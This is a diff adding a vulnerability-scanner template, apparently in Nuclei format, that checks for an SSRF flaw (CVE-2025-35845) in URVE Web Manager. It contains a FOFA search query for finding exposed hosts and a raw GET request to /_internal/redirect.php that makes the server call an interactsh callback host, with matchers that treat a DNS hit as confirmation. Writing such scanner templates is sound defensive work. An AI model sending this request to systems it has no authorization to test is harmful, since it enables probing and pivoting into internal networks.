@@ -1,0 +1,30 @@
+id: urve-web-manager-edirect-ssrf
+info:
+  name: "URVE Web Manager edirect接口 SSRF 漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="URVE Web Manager"
+      该漏洞源于URVE Web Manager系统中edirect接口未正确验证用户输入的URL参数，攻击者可构造恶意请求实现服务器端请求伪造（SSRF），进而可能获取内网服务信息或发起链式攻击。
+  reference:
+  - CVE-2025-35845
+  tags: URVE
+http:
+- raw:
+  - |
+    GET /_internal/redirect.php?url=http://{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept: */*
+    Accept-Language: en
+    Cookie: u_lang=en; PHPSESSID=679bfd602c74f6a3bbb5f36902dbbe74
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
